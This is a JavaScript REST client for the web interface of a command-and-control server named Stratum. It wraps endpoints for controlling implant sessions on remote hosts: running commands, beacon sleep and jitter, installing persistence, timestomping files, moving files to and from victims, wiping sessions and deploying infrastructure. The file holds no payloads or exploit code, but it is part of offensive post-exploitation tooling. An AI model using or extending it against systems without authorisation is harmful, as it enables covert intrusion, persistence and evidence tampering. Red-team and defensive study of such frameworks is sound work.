/* ─────────────────────────────────────────────────────────────────────────────
   api.js — REST client for Stratum C2 server
   Auth via httpOnly cookie (stratum_token) — no token in JS memory or localStorage.
   Credentials attached automatically by the browser on every same-origin request.
   Throws {status, message} on HTTP errors.
───────────────────────────────────────────────────────────────────────────── */

const API = (() => {
  const BASE = '';  // same-origin; server serves WebGUI as static files

  let _username = null;
  let _display  = null;

  function setAuth(username, display = null) {
    _username = username;
    _display  = display || username;
  }

  function getUsername() { return _username; }
  function getDisplay()  { return _display || _username; }
  function isLoggedIn()  { return !!_username; }

  async function _req(method, path, body = null, signal = null) {
    const opts = {
      method,
      headers:     { 'Content-Type': 'application/json' },
      credentials: 'same-origin',
      signal,
    };
    if (body !== null) opts.body = JSON.stringify(body);

    let res;
    try {
      res = await fetch(BASE + path, opts);
    } catch (e) {
      throw { status: 0, message: 'Network error: ' + e.message };
    }

    if (res.status === 204) return null;
    let data;
    try { data = await res.json(); } catch { data = {}; }

    if (!res.ok) {
      const msg = data.detail || data.message || `HTTP ${res.status}`;
      throw { status: res.status, message: msg };
    }
    return data;
  }

  const get    = (path, signal) => _req('GET', path, null, signal);
  const post   = (path, body)   => _req('POST', path, body);
  const del    = (path)         => _req('DELETE', path);

  /* ── Auth ───────────────────────────────────────────────────────────────── */
  async function login(username, password) {
    const data = await post('/api/v1/auth/login', { username, password });
    setAuth(data.username || username, data.display);
    return data;
  }

  // Called after OIDC callback redirect with ?oidc_display=...
  // Cookie is already set by the server redirect — just fetch identity via /me.
  async function oidcHandleCallback(display) {
    try {
      const data = await me();
      setAuth(data.username, display || data.display);
    } catch {}
  }

  // Returns the provider authorization URL to redirect the browser to.
  async function oidcStart() {
    const data = await get('/api/v1/auth/oidc/start');
    return data.url;
  }

  // Returns { auth_mode: "local" | "oidc-manual" | "oidc-auto" }
  async function authMode() { return get('/api/v1/auth/mode'); }

  async function logout() {
    try { await post('/api/v1/auth/logout', {}); } catch {}
    setAuth(null, null);
  }

  async function me() { return get('/api/v1/auth/me'); }

  /* ── Sessions ───────────────────────────────────────────────────────────── */
  function sessions()                    { return get('/api/v1/sessions'); }
  function session(id)                   { return get(`/api/v1/sessions/${id}`); }
  function wipeSession(id, opts = {})    { return _req('POST', `/api/v1/sessions/${id}/wipe`, opts); }
  function killSession(id)               { return del(`/api/v1/sessions/${id}`); }
  function sendCommand(id, command, display) {
    return post(`/api/v1/sessions/${id}/command`, { command, display });
  }
  function sysinfo(id)                   { return post(`/api/v1/sessions/${id}/sysinfo`, {}); }
  function sleep(id, seconds)            { return post(`/api/v1/sessions/${id}/sleep`, { seconds }); }
  function jitter(id, percent)           { return post(`/api/v1/sessions/${id}/jitter`, { percent }); }
  function killAgent(id)                 { return post(`/api/v1/sessions/${id}/kill`, {}); }
  function persist(id, action)              { return post(`/api/v1/sessions/${id}/persist`, { action }); }
  function persistProbe(id, techniques = null) { return post(`/api/v1/sessions/${id}/persist/probe`, techniques ? { techniques } : {}); }
  function persistInstall(id, technique)    { return post(`/api/v1/sessions/${id}/persist/install`, { technique }); }
  function persistRemove(id, technique)     { return post(`/api/v1/sessions/${id}/persist/remove`, { technique }); }
  function persistStatus(id, technique)     { return post(`/api/v1/sessions/${id}/persist/status`, { technique }); }
  function timestomp(id, payload = {})   { return post(`/api/v1/sessions/${id}/timestomp`, payload); }
  function download(id, remote_path)     { return _req('POST', `/api/v1/sessions/${id}/download?remote_path=${encodeURIComponent(remote_path)}`, null); }
  async function uploadFile(id, file, remote_path) {
    const form = new FormData();
    form.append('file', file);
    const url = `/api/v1/sessions/${id}/upload?remote_path=${encodeURIComponent(remote_path)}`;
    let res;
    try {
      res = await fetch(url, { method: 'POST', credentials: 'same-origin', body: form });
    } catch (e) {
      throw { status: 0, message: 'Network error: ' + e.message };
    }
    if (res.status === 204) return null;
    let data;
    try { data = await res.json(); } catch { data = {}; }
    if (!res.ok) throw { status: res.status, message: data.detail || `HTTP ${res.status}` };
    return data;
  }
  function history(id)                   { return get(`/api/v1/sessions/${id}/history`); }
  function artifacts(id)                 { return get(`/api/v1/sessions/${id}/artifacts`); }
  function downloadedFiles(id)           { return get(`/api/v1/sessions/${id}/downloads`); }
  function staging(id)                   { return get(`/api/v1/sessions/${id}/staging`); }
  function stopPolling(id)               { return post(`/api/v1/sessions/${id}/poll/stop`, {}); }
  function resumePolling(id)             { return post(`/api/v1/sessions/${id}/poll/resume`, {}); }
  function deleteDownload(id, fname)     { return del(`/api/v1/sessions/${id}/downloads/${encodeURIComponent(fname)}`); }
  function listUploads(id)                     { return get(`/api/v1/sessions/${id}/uploads`); }
  function markUploadRemoved(id, remotePath)   { return _req('PATCH', `/api/v1/sessions/${id}/uploads?remote_path=${encodeURIComponent(remotePath)}&action=remove`); }
  function restoreUpload(id, remotePath)       { return _req('PATCH', `/api/v1/sessions/${id}/uploads?remote_path=${encodeURIComponent(remotePath)}&action=restore`); }
  function stagingFile(id, fname)        { return `/api/v1/sessions/${id}/staging/${fname}`; }
  function downloadedFileUrl(id, fname)  { return `/api/v1/sessions/${id}/downloads/${fname}`; }

  /* ── Deploy ─────────────────────────────────────────────────────────────── */
  function providers()                   { return get('/api/v1/deploy/providers'); }
  function startDeploy(config)           { return post('/api/v1/deploy', config); }
  function cancelDeploy(task_id)         { return del(`/api/v1/deploy/${task_id}`); }
  function deployStreamUrl(task_id)      { return `${BASE}/api/v1/deploy/${task_id}/stream`; }
  function oauthExchange(provider, credentials, code, cred_label) {
    return post('/api/v1/deploy/oauth/exchange', { provider, credentials, code, cred_label: cred_label || '' });
  }
  function oauthStart(provider, credentials, cred_label) {
    return post('/api/v1/deploy/oauth/start', { provider, credentials, cred_label: cred_label || '' });
  }
  function oauthResult(session_id) {
    return get(`/api/v1/deploy/oauth/result/${session_id}`);
  }

  /* ── Credentials (credentials/{provider}.json on disk, shared with deploy wizard) ── */
  function credList(provider)            { return get(`/api/v1/credentials/${encodeURIComponent(provider)}`); }
  function credDelete(provider, id)      { return del(`/api/v1/credentials/${encodeURIComponent(provider)}/${encodeURIComponent(id)}`); }

  /* ── Tradecraft — deployment package browser ─────────────────────────────── */
  function tradecraftList()       { return get('/api/v1/tradecraft'); }
  function tradecraftDelete(name) { return del(`/api/v1/tradecraft/${encodeURIComponent(name)}`); }

  /* ── Operators ──────────────────────────────────────────────────────────── */
  function operators()                   { return get('/api/v1/operators'); }

  /* ── User preferences ───────────────────────────────────────────────────── */
  function getPrefs()          { return get('/api/v1/me/prefs'); }
  function savePrefs(data)     { return _req('PATCH', '/api/v1/me/prefs', { prefs: data }); }

  /* ── History archives ───────────────────────────────────────────────────── */
  function listArchives()                { return get('/api/v1/history/archives'); }
  function readArchive(filename)         { return get(`/api/v1/history/archives/${encodeURIComponent(filename)}`); }
  function archiveArtifacts(filename)    { return get(`/api/v1/history/archives/${encodeURIComponent(filename)}/artifacts`); }
  function deleteArchive(filename)       { return del(`/api/v1/history/archives/${encodeURIComponent(filename)}`); }

  /* ── Server settings ────────────────────────────────────────────────────── */
  function getServerSettings()          { return get('/api/v1/server/settings'); }
  function patchServerSettings(data)    { return _req('PATCH', '/api/v1/server/settings', data); }
  function getServerTime()              { return get('/api/v1/server/time'); }

  /* ── Chat ───────────────────────────────────────────────────────────────── */
  function chatHistory(date = null) {
    const q = date ? `?date=${encodeURIComponent(date)}` : '';
    return get(`/api/v1/chat${q}`);
  }
  function chatDates()                   { return get('/api/v1/chat/dates'); }
  function sendChat(message)             { return post('/api/v1/chat', { text: message }); }
  function listChatDates()               { return get('/api/v1/chat/dates'); }
  function listChatHistoryDates()        { return get('/api/v1/chat/history/dates'); }
  function listChatHistoryDatesWithInfo(){ return get('/api/v1/chat/history/dates/info'); }
  function getChatForDate(date)          { return get(`/api/v1/chat?date=${encodeURIComponent(date)}`); }
  function deleteChatDate(date)          { return del(`/api/v1/chat?date=${encodeURIComponent(date)}`); }
  function exportChatDate(date) {
    const url = `/api/v1/chat/export?date=${encodeURIComponent(date)}`;
    return new Promise((resolve) => {
      const link = document.createElement('a');
      link.href = url;
      link.download = `chat_${date}.jsonl`;
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
      resolve();
    });
  }

  return {
    setAuth, getUsername, getDisplay, isLoggedIn,
    login, oidcHandleCallback, oidcStart, authMode, logout, me,
    sessions, session, killSession, wipeSession,
    sendCommand, sysinfo, sleep, jitter, killAgent,
    persist, persistProbe, persistInstall, persistRemove, persistStatus,
    timestomp, download, uploadFile,
    history, artifacts, downloadedFiles, staging, stagingFile, downloadedFileUrl,
    stopPolling, resumePolling, deleteDownload, listUploads, markUploadRemoved, restoreUpload,
    providers, startDeploy, cancelDeploy, deployStreamUrl, oauthExchange, oauthStart, oauthResult,
    credList, credDelete,
    tradecraftList, tradecraftDelete,
    operators,
    chatHistory, chatDates, sendChat, listChatDates, listChatHistoryDates, listChatHistoryDatesWithInfo, getChatForDate, deleteChatDate, exportChatDate,
    getPrefs, savePrefs,
    getServerSettings, patchServerSettings, getServerTime,
    listArchives, readArchive, archiveArtifacts, deleteArchive,
  };
})();
